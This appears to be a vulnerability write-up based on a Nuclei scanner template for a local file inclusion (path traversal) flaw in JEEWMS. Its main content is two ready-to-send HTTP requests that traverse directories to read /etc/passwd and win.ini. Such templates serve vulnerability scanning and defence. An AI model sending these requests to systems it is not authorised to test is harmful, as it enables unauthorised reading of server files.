# Nuclei Template: JEEWMS - Local File Inclusion
**Template ID:** jeewms-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`jeewms-lfi.yaml`)

## Vulnerability Information & PoC

## Description
JEEWMS is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

## References
- https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
